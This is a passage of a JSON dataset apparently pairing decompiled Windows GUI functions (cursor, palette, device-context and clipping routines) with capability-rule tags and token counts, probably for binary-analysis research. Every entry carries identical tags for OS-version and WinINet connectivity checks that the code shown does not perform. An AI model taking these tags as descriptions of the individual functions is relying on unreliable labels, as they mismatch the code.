        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0044ea9c(void)\n\n{\n    uint *puVar1;\n    char in_AL;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_11h;\n    uint var_dh;\n    uint var_9h;\n    uint var_1h;\n    \n    puStack32 = &fcn.0044ea9c::var_1h + 1;\n    puStack44 = &fcn.0044ea9c::var_1h + 1;\n    piVar5 = NULL;\n    if ((*0x499c84 == NULL) || (*(*0x499c84 + 5) != '\\0')) {\n        return;\n    }\n    uStack36 = 0x44edb1;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    *0x499cb0 = *0x499c84;\n    uStack48 = 0x44ed3f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    *(*0x499c84 + 5) = 1;\n    *(*0x499c84 + 8) = in_AL;\n    var_1h._0_1_ = in_AL;\n    fcn.0044d91c();\n    if (*0x499ca0 == '\\x02') {\n        piVar5 = fcn.00404800();\n        (**(*piVar5 + 0x34))();\n        *(piVar5 + 0x1d) = piVar5[2] == 0;\n    }\n    if ((*0x499c84)[2] == 0) {\ncode_r0x0044eb74:\n        var_dh = (*0x499c84)[5];\n    }\n    else {\n        cVar2 = fcn.004047dc();\n        if (cVar2 == '\\0') goto code_r0x0044eb74;\n        var_dh = (*0x499c84)[7];\n    }\n    uStack60 = 0x44eb8b;\n    cVar2 = fcn.0044ea28(&fcn.0044ea9c::var_1h + 1);\n    if (cVar2 != '\\0') {\n        if ((*0x499ca0 == '\\x02') && (*(piVar5 + 0x1d) != '\\0')) {\ncode_r0x0044ebb3:\n            if (var_1h != '\\0') {\n                uVar3 = 1;\n                goto code_r0x0044ebbf;\n            }\n        }\n        else if (*0x499ca0 != '\\0') {\n            cVar2 = fcn.0044e330();\n            if (cVar2 != '\\0') goto code_r0x0044ebb3;\n        }\n    }\n    uVar3 = 0;\ncode_r0x0044ebbf:\n    if (*0x499ca0 == '\\x02') {\n        if ((uVar3 != 0) && (*(piVar5 + 0x1d) != '\\0')) {\n            iVar4 = fcn.0043bd90();\n            if ((iVar4 != 0) && (*(iVar4 + 0x268) == piVar5[0x10])) {\n                fcn.00440ad0();\n            }\n            uStack60 = 0x44ec0e;\n            fcn.00451b4c(*0x499c84);\n        }\n    }\n    else if (*0x499ca4 == 0) {\n        uStack60 = 0x44ec30;\n        sub.user32.dll_SetCursor();\n    }\n    else {\n        fcn.0045a2f0();\n    }\n    *0x499c80 = 0;\n    *0x499c84 = NULL;\n    if ((*0x499cb0 != NULL) && ((*0x499cb0)[2] != 0)) {\n        if (uVar3 == 0) {\n            (*0x499cb0)[4] = 0;\n            (*0x499cb0)[5] = 0;\n        }\n        puVar1 = *0x499cb0;\n        uStack60 = 0x44ece3;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        arg_8h = *0x499cb0 + 4;\n        fcn.0044e1fc(arg_8h, (*0x499cb0)[2]);\n        *in_FS_OFFSET = arg_8h;\n        if (*0x499cb0 == NULL) {\n            *0x499cb0 = puVar1;\n        }\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x44ed46;\n    uStack48 = 0x44ed01;\n    fcn.00404650();\n    *0x499cac = 0;\n    if (*0x499cb0 != NULL) {\n        *(*0x499cb0 + 5) = 0;\n        uStack48 = var_dh;\n        uStack52 = uVar3;\n        (****0x499cb0)();\n    }\n    *0x499c84 = NULL;\n    return;\n}\n",
        "token_count": 1266
    },
    "0044edc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044edc0(void)\n\n{\n    if (*0x499c84 != 0) {\n        fcn.0044ea9c();\n    }\n    *0x499c80 = 0;\n    return;\n}\n",
        "token_count": 53
    },
    "0044ee58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044ee58(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX == 0) {\n        iVar1 = fcn.00404620();\n        *in_EAX = iVar1;\n    }\n    fcn.00419740();\n    return;\n}\n",
        "token_count": 74
    },
    "0044ee80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044ee80(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.004199dc();\n    if (*(*in_EAX + 8) == 0) {\n        fcn.00404650();\n        *in_EAX = 0;\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "0044ef8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044ef8c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x44ef9c;\n    var_8h = fcn.00419c08();\n    uStack24 = 0x44f02a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x44efc7;\n            var_ch = fcn.00419898();\n            puStack32 = 0x44efd2;\n            cVar1 = fcn.004255ac();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x44f002;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.0044f10c();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x44f009;\n                uStack36 = 0x44f001;\n                fcn.00425608();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x44f031;\n    uStack24 = 0x44f029;\n    fcn.00419c6c();\n    return;\n}\n",
        "token_count": 454
    },
    "0044f064": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044f064(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) == 0) {\n        puStack16 = 0x44f07d;\n        fcn.00425798();\n    }\n    else {\n        if (*(in_EAX + 0x5c) == 0) {\n            puStack16 = 0x44f095;\n            iVar1 = fcn.00419c08();\n            uStack20 = 0x44f0e9;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            if (3 < *(iVar1 + 8)) {\n                puStack16 = &stack0xfffffffc;\n                fcn.0044eed0();\n            }\n            uVar2 = (**(**(in_EAX + 0x58) + 0x48))();\n            *(in_EAX + 0x5c) = uVar2;\n            fcn.00419740();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x44f0f0;\n            uStack20 = 0x44f0e8;\n            fcn.00419c6c();\n            return;\n        }\n        puStack16 = 0x44f0fe;\n        fcn.0042579c();\n        puStack16 = 0x44f106;\n        fcn.0044f158();\n    }\n    return;\n}\n",
        "token_count": 386
    },
    "0044f10c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044f10c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) != 0) {\n        fcn.0042579c();\n        fcn.00419c1c();\n        sub.user32.dll_ReleaseDC(*(in_EAX + 0x60), *(in_EAX + 0x5c));\n        *(in_EAX + 0x5c) = 0;\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0044f2c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044f2c4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack48 = &fcn.0044f2c4::var_1h + 1;\n    var_8h = 0;\n    uStack52 = 0x44f391;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_1h._0_1_ = 1;\n    arg_8h = 0x44f2f9;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        arg_8h = 0x44f30b;\n        cVar1 = fcn.0040484c();\n        if ((((cVar1 != '\\0') && (*(**0x494b0c + 0x7c) != '\\0')) && (*(*(in_EAX + 0x10) + 0x84) != 0)) &&\n           (*param_2 != 0)) {\n            arg_8h = &fcn.0044f2c4::var_8h;\n            fcn.00433b40();\n            fcn.0040af98(arg_8h);\n            fcn.00405584();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x44f398;\n    iStack56 = 0x44f388;\n    fcn.00405530();\n    iStack56 = 0x44f390;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 484
    },
    "0044f6fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0044f6fc(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ffc4();\n    in_EAX[0xf] = in_EAX;\n    in_EAX[0xe] = *(*in_EAX + 0x78);\n    in_EAX[0x14] = *0x44f7ec;\n    iVar1 = fcn.00424528();\n    in_EAX[0x1a] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x450944;\n    *(in_EAX + 0x61) = *0x44f7f0;\n    iVar1 = fcn.0044f184();\n    in_EAX[0x1d] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x451908;\n    iVar1 = fcn.0045dcac();\n    in_EAX[0x1e] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x4533e0;\n    in_EAX[0x1c] = -0xfffffb;\n    *(in_EAX + 0x57) = 1;\n    *(in_EAX + 0x16) = 1;\n    *(in_EAX + 0x59) = 1;\n    *(in_EAX + 0x5a) = 1;\n    *(in_EAX + 0x8e) = 1;\n    *(in_EAX + 0x18) = 1;\n    *(in_EAX + 0x5e) = 0;\n    *(in_EAX + 0x7e) = 0xfff4;\n    in_EAX[0x2b] = *0x43b1d4;\n    *(in_EAX + 0x56) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 588
    },
    "0044f900": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044f900(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_stack_ffffffe8;\n    uint uStack20;\n    \n    uVar2 = 0;\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar1 = fcn.0040484c(in_stack_ffffffe8 & 0xffffff00 | param_2);\n        if (iVar1 != 0) {\n            uStack20 = (**(*in_EAX + 0x48))();\n            uVar2 = sub.gdi32.dll_SelectPalette();\n            iVar1 = sub.gdi32.dll_RealizePalette(uStack20);\n            if (iVar1 != 0) {\n                (**(*in_EAX + 0x80))();\n            }\n            sub.gdi32.dll_SelectPalette(uStack20, uVar2, 0xffffffff);\n            sub.user32.dll_ReleaseDC(uVar2);\n            uVar2 = 1;\n        }\n    }\n    return CONCAT44(uStack20, uVar2);\n}\n",
        "token_count": 253
    },
    "0044fb2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044fb2c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 8;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x6c))();\n    }\n    fcn.0042043c();\n    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfff7;\n    if (in_EAX[0xc] != 0) {\n        fcn.00451b4c(0);\n        fcn.00451b4c(0);\n        fcn.00451b4c(0);\n        fcn.00451b4c(0);\n        fcn.00451b4c(0);\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "0044fff4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044fff4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x94)) {\n        if ((*(in_EAX + 0x94) != 0) && (*(*(in_EAX + 0x94) + 0x1ac) != 0)) {\n            puStack40 = 0x450039;\n            fcn.004199dc();\n            puStack40 = 0x45004a;\n            fcn.004202d8();\n        }\n        if (((param_2 != 0) && (param_2 != -1)) && (*(param_2 + 0x1ac) != 0)) {\n            puStack40 = 0x45006a;\n            fcn.00419740();\n        }\n    }\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x400;\n    uStack44 = 0x450114;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    if (param_2 != -1) {\n        puStack40 = &stack0xfffffffc;\n        fcn.0040484c();\n    }\n    iVar1 = *(in_EAX + 0x94);\n    if (param_2 != iVar1) {\n        if (param_2 == -1) {\n            *(in_EAX + 0x94) = 0;\n        }\n        else {\n            *(in_EAX + 0x94) = param_2;\n            if (param_2 != 0) {\n                fcn.0040484c();\n                fcn.00420098();\n            }\n        }\n        if (iVar1 != 0) {\n            fcn.0040484c();\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xfbff;\n    return;\n}\n",
        "token_count": 523
    },
    "00450294": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00450294(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x450315;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.00407550();\n        fcn.0040db38(in_stack_ffffffd4, arg_ch);\n        fcn.00404ec4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    (**(**(in_EAX + 0x30) + 0x40))();\n    *param_2 = *param_2 + *(in_EAX + 0x40);\n    param_2[1] = param_2[1] + *(in_EAX + 0x44);\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x45031c;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 389
    },
    "00450430": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00450430(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x94) != 0) && (*0x499c84 == 0)) && (*0x450498 == (*0x450494 & *(in_EAX + 0x1c)))) {\n        var_8h = arg_8h;\n        fcn.00451b4c(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "004509c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004509c0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x59)) && (*(in_EAX + 0x59) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00451b4c(0);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00450a5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450a5c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x5a)) && (*(in_EAX + 0x5a) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00451b4c(0);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "00450a80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450a80(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x60)) && (*(in_EAX + 0x60) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00451b4c(0);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00450bb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00450bb8(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x450c4e;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        uVar2 = 0;\n        fcn.00407550();\n        fcn.0040db38(uVar2, arg_ch);\n        fcn.00404ec4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    uVar2 = (**(**(in_EAX + 0x30) + 0x48))();\n    sub.gdi32.dll_SetViewportOrgEx(uVar2, *(in_EAX + 0x40), *(in_EAX + 0x44), 0);\n    sub.gdi32.dll_IntersectClipRect(uVar2, 0, 0, *(in_EAX + 0x48), *(in_EAX + 0x4c));\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x450c55);\n    return;\n}\n",
        "token_count": 397
    },
    "00450c60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.00450c60(int32_t lprcSrc1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lprcSrc2;\n    uint lprcDst;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    iVar1 = fcn.004198f4();\n    do {\n        do {\n            if (iVar1 < 1) {\n                return 0;\n            }\n            iVar1 = iVar1 + -1;\n            iVar2 = fcn.00419898();\n        } while ((*(iVar2 + 0x57) == '\\0') || ((*(iVar2 + 0x50) & 0x40) == 0));\n        fcn.004501b4();\n        sub.user32.dll_IntersectRect(&lprcDst, lprcSrc1 + -0x14, &lprcSrc2);\n        iVar2 = sub.user32.dll_EqualRect(&lprcDst, lprcSrc1 + -0x14);\n    } while (iVar2 == 0);\n    return var_1h;\n}\n",
        "token_count": 279
    },
    "00450cec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00450cec(uint param_1, char param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint var_15h;\n    int32_t var_4h;\n    \n    if (param_2 == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            return;\n        }\n        if ((*(in_EAX + 0x51) & 4) != 0) {\n            return;\n        }\n    }\n    if (*(in_EAX + 0x30) == 0) {\n        return;\n    }\n    var_4h = in_EAX;\n    cVar2 = fcn.00458904();\n    if (cVar2 != '\\0') {\n        fcn.004501b4();\n        if (((var_15h == '\\0') && ((*(*(var_4h + 0x30) + 0x50) & 0x40) == 0)) &&\n           (cVar2 = fcn.00450c60(&stack0xfffffffc),  cVar2 == '\\0')) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n        uVar3 = fcn.004585f8(&var_15h + 1, -uVar1);\n        sub.user32.dll_InvalidateRect(uVar3);\n        return;\n    }\n    return;\n}\n",
        "token_count": 349
    },
    "00450d8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.00450d8c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    unkbyte3 in_ECX;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = CONCAT13(in_ECX, in_ECX) & 0xff00ffff;\n    if (*(in_EAX + 0x12a) != 0) {\n        (**(in_EAX + 0x128))(auStack8 + 2, arg_8h, arg_ch, arg_10h, in_ECX);\n    }\n    return auStack8[2];\n}\n",
        "token_count": 175
    },
    "00450dd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450dd4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    \n    piVar1 = fcn.0043bd90();\n    piVar2 = fcn.0044d640();\n    if ((((piVar2 != NULL) && (piVar1 != piVar2)) && (in_EAX != piVar2)) && (piVar2[0xc] == 0)) {\n        (**(*piVar2 + 0x78))();\n    }\n    if (*(param_2 + 0xc) == 0) {\n        if ((piVar1 == NULL) || (in_EAX == piVar1)) {\n            arg_8h = *(param_2 + 8);\n            uVar3 = fcn.00451b4c(arg_8h);\n            *(arg_8h + 0xc) = uVar3;\n        }\n        else {\n            fcn.0040484c();\n        }\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "00450e68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00450e68(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x57) != '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x51) & 4) == 0)))) &&\n       (in_EAX[0xc] != 0)) {\n        uStack20 = 0x450ead;\n        cVar1 = fcn.00458904();\n        if (cVar1 != '\\0') {\n            if ((*(in_EAX + 0x14) & 0x40) != 0) {\n                uStack20 = 0x450ecd;\n                uStack20 = fcn.004585f8();\n                puStack24 = 0x450ed3;\n                uVar2 = sub.user32.dll_GetDC();\n                uStack28 = 0x450f41;\n                uStack32 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffe0;\n                uVar3 = uVar2;\n                puStack24 = &stack0xfffffffc;\n                sub.gdi32.dll_IntersectClipRect\n                          (uVar2, in_EAX[0x10], in_EAX[0x11], in_EAX[0x10] + in_EAX[0x12], in_EAX[0x11] + in_EAX[0x13]);\n                fcn.00455ee8();\n                *in_FS_OFFSET = uVar3;\n                uVar3 = fcn.004585f8(uVar2, 0x450f5e);\n                sub.user32.dll_ReleaseDC(uVar3);\n                return;\n            }\n            uStack20 = 0x450f53;\n            (**(*in_EAX + 0x80))();\n            uStack20 = 0x450f5e;\n            (**(*in_EAX + 0x8c))();\n        }\n    }\n    return;\n}\n",
